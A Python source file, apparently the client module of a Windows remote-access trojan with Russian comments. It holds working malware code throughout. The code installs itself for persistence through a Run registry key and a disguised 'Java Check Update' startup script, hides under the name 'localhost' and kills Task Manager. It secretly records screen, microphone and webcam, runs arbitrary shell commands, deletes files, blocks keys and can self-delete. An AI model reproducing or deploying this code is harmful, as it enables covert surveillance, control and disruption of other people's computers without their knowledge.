import os 
import asyncio
import subprocess
import sys
import config
import pyautogui
import webbrowser as wb
import platform
import psutil
import socket
import json
import winreg
import shutil
import sqlite3
import base64
import win32crypt
import ctypes
import cv2
from aiofiles import open as aio_open
import time
import mss
import numpy as np
import pyaudio
import keyboard
import mouse
import wave

async def self_delete():
    """KILL YOURSELF"""
    script_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]

    if os.name == "nt":
        delete_cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{script_path}"'
        subprocess.Popen(["cmd.exe", "/c", delete_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        delete_cmd = f"sh -c 'sleep 3 && rm -f \"{script_path}\"'"
        subprocess.Popen(delete_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    sys.exit()

async def shutdowm(Reboot=False):
    """OFF OR REBOOT"""
    if Reboot == True:
        os.system("shutdown /r /f /t 0")
    else:
        os.system("shutdown /s /f /t 0")
    
async def record_screen_and_audio(duration):
    """RECORD DISPLAY AND AUDIO"""
    timestamp = int(time.time())
    video_filename = f'output_video_{timestamp}.avi'
    audio_filename = f'output_audio_{timestamp}.wav'

    with mss.mss() as sct:
        screen = sct.monitors[1] 
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen['width'], screen['height']))

        p = pyaudio.PyAudio()
        audio_stream = p.open(format=pyaudio.paInt16,
                              channels=1,
                              rate=44100,
                              input=True,
                              frames_per_buffer=1024)

        audio_frames = []

        start_time = time.time() 
        last_time = start_time 

        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time >= duration:
                break  

            img = sct.grab(screen)
            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_RGBA2BGR)

            out.write(frame)

            audio_data = audio_stream.read(1024)
            audio_frames.append(audio_data)

            current_time = time.time()
            time_diff = current_time - last_time
            sleep_time = max(0, (1 / 20) - time_diff)

            await asyncio.sleep(sleep_time)

            last_time = current_time 

        out.release()

        with wave.open(audio_filename, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(audio_frames))

        audio_stream.stop_stream()
        audio_stream.close()
        p.terminate()

    return video_filename, audio_filename

async def copy_and_run():
    """COPY TO ANOTHER DIRECTORY AND RESTART FROM THERE WITH NEW NAME"""
    exe_name = "localhost.exe"  
    new_dir = r"C:\ProgramData"
    new_path = os.path.join(new_dir, exe_name)

    if not os.path.exists(new_path):
        try:
            shutil.copy(sys.executable, new_path)
        except Exception:
            return False

    """ADD TO AUTOLOAD"""
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "localhost", 0, winreg.REG_SZ, new_path)
    except Exception:
        return False

    """RESTART WITH NEW NAME"""
    if sys.executable != new_path:
        try:
            subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
            await asyncio.sleep(1)
            sys.exit()
        except Exception:
            return False

    """RENAME PROCESS"""
    await rename_process("localhost")

    return True

async def rename_process(new_name):
    """RENAME PROCESS IN TASK MANAGER"""
    try:
        proc = psutil.Process(os.getpid())
        proc.name(new_name)

        """Изменить иконку процесса на стандартную Windows"""
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            hicon = ctypes.windll.user32.LoadIconW(0, 32512)  # IDI_APPLICATION (стандартная иконка Windows)
            ctypes.windll.user32.SendMessageW(hwnd, 0x80, 0, hicon)  # WM_SETICON (маленькая иконка)
    except Exception:
        pass

async def close_taskmgr():
    """CLOSE TASK MANAGER(US IF YOU WANT)"""
    while True:
        try:
            for process in psutil.process_iter(['pid', 'name']):
                if process.info['name'] == "Taskmgr.exe":
                    process.kill()
                    print("Диспетчер задач закрыт.")
            await asyncio.sleep(1) 
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            print(f"Ошибка: {e}")
            await asyncio.sleep(1)  

"""GET INFO FROM PC AND WRITE TO JSON"""
async def get_ip_addresses():
    ip_addresses = {
        'local': [],
        'external': []
    }
    
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ip_addresses['local'].append(addr.address)

    try:
        external_ip = socket.gethostbyname(socket.gethostname())
        ip_addresses['external'].append(external_ip)
    except:
        pass

    return ip_addresses

async def get_disk_info():
    disk_info = []
    
    for partition in psutil.disk_partitions():
        partition_info = {}
        partition_info['device'] = partition.device
        partition_info['mountpoint'] = partition.mountpoint
        partition_info['fstype'] = partition.fstype

        usage = psutil.disk_usage(partition.mountpoint)
        partition_info['total'] = usage.total
        partition_info['used'] = usage.used
        partition_info['free'] = usage.free
        partition_info['percent'] = usage.percent

        disk_info.append(partition_info)

    return disk_info

async def collect_system_info():
    system_info = {
        "Операционная система": platform.system(),
        "Версия ОС": platform.version(),
        "Архитектура процессора": platform.architecture(),
        "Имя компьютера": platform.node(),
        "Процессор": platform.processor(),
        "Количество ядер": psutil.cpu_count(logical=False),
        "Логические процессоры": psutil.cpu_count(logical=True),
        "Память": psutil.virtual_memory(),
        "Диск": await get_disk_info(),
        "IP-адреса": await get_ip_addresses(),
        "Директория с которой запущен": os.getcwd(),
    }

    return system_info

async def save_to_json(data, filename='system_info.json'):
    async with aio_open(filename, 'w', encoding='utf-8') as f:
        await f.write(json.dumps(data, ensure_ascii=False, indent=4))

async def get_info():
    try:
        system_info = await collect_system_info()
        await save_to_json(system_info)
        return 'Succeful'
    except Exception:
        return 'Error get info'

async def take_screenshot(filename="prikol.png"):
    """SCREENSHOT"""
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

class ConsoleManager:
    """CONSOLE:)"""
    def __init__(self, start_dir=None):
        self.current_dir = start_dir or os.getcwd()
        self.history = [self.current_dir]
        self.history_index = 0

    def change_directory(self, new_dir):
        if new_dir == "..":
            new_path = os.path.dirname(self.current_dir)
        else:
            new_path = os.path.join(self.current_dir, new_dir)

        if os.path.isdir(new_path):
            self.current_dir = os.path.abspath(new_path)
            if self.history_index < len(self.history) - 1:
                self.history = self.history[:self.history_index + 1]
            self.history.append(self.current_dir)
            self.history_index += 1
            return f"You go to: {self.current_dir}"
        return f"Error: path '{new_dir}' not found"

    def go_back(self):
        if self.history_index > 0:
            self.history_index -= 1
            self.current_dir = self.history[self.history_index]
            return f"You back to: {self.current_dir}"
        return "You in based path"

    def go_forward(self):
        if self.history_index < len(self.history) - 1:
            self.history_index += 1
            self.current_dir = self.history[self.history_index]
            return f"You go to: {self.current_dir}"
        return "You in last path"

    def get_file_path(self, filename):
        file_path = os.path.join(self.current_dir, filename)
        if os.path.exists(file_path):
            return file_path
        return None

    def execute_command(self, command):
        if command.startswith("cd "):
            return self.change_directory(command[3:].strip())
        elif command == "back":
            return self.go_back()
        elif command == "forward":
            return self.go_forward()

        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding="cp866", cwd=self.current_dir, startupinfo=startupinfo)
            output, error = process.communicate()
        except Exception as e:
            return f"Error: {e}"

        return output.strip() if output.strip() else error.strip() if error.strip() else "No result"
    
async def delete_file(filename):
    if os.path.exists(filename):
        if os.path.isdir(filename):
            shutil.rmtree(filename)#DELETE DIR 
        else:
            os.remove(filename)#DELETE FILE

async def play_and_delete(file_path):
    """PLAY FILE"""
    if not os.path.exists(file_path):
        return 'not found'

    process = subprocess.Popen(["start", "", file_path], shell=True) 
    process.wait()

async def open_link(link='https://www.google.com/search?sca_esv=c626e369dc3244e1&sxsrf=AHTn8zprUNJnDyCz6e7sPALxhrnoyBiDqg:1739734543000&q=смайл+дог+скример&uds=ABqPDvztZD_Nu18FR6tNPw2cK_RRWyJ6DTvTbOlKR1u4IKjt3A-Xco9fQiDynlSyPh0DKNFJej_SFsAOYmTt7MRBj0uyn3FCtRaTadHEH8NohrTzyOo9YvZh7aMsLAkMtdkVWSe0TwDuCCcNWfMCQSMKZ8yqqzfBb0KyvLOQs7zSsEOBpT6xRko&udm=2&sa=X&ved=2ahUKEwjqo8Gb-MiLAxXkGRAIHcM7BjYQxKsJegUIjwEQAQ&ictx=0&biw=1878&bih=934&dpr=1'):
    """OPEN PAGE IN BROWSER"""
    wb.open(link, 1)

async def add_to_autostart():
    """SECOND FUNCTION TO ADD TO AUTOLOAD, USE IF NECESSARY"""
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_file = os.path.join(startup_folder, "Java Check Update.bat")

    with open(bat_file, "w") as f:
        f.write(f'@echo off\npythonw "{script_path}"\nexit')

async def record_video(later):
    """RECORD WEB CAMERA"""
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    fps = 20.0  
    frame_width = 640 
    frame_height = 480  
    
    cap = cv2.VideoCapture(0)  

    if not cap.isOpened():
        return 'No web cam'

    start_time = time.time()
    video_count = 1

    out = None 
    video_filename = None  

    cv2.namedWindow("Recording Video", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("Recording Video", cv2.WND_PROP_FULLSCREEN, 0) 

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        elapsed_time = time.time() - start_time

        if elapsed_time >= later: 
            if out:
                out.release()
            start_time = time.time()
            video_count += 1
            video_filename = f"video_part_{video_count}.avi"
            out = cv2.VideoWriter(video_filename, fourcc, fps, (frame_width, frame_height))
            out.write(frame)

        if out:
            out.write(frame)


        await asyncio.sleep(0.01)  

    cap.release()
    if out:
        out.release()
    cv2.destroyAllWindows()

    return video_filename

def set_wallpaper(image_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, image_path)
        key.Close()
    
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return 'wallper hes changed!'
    except Exception as e:
        return f'error {e}'
    
async def block_input(value): 
    mouse.move(100, 100, absolute=True, duration=0.1)
    keyboard.block_key('esc')
    keyboard.block_key('win')
    keyboard.block_key('delete')
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('tab')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')

async def unblock():
    await block_input(False)
    keyboard.unhook_all()
    mouse.unhook_all()

async def main_cycle():
    await copy_and_run()
    return True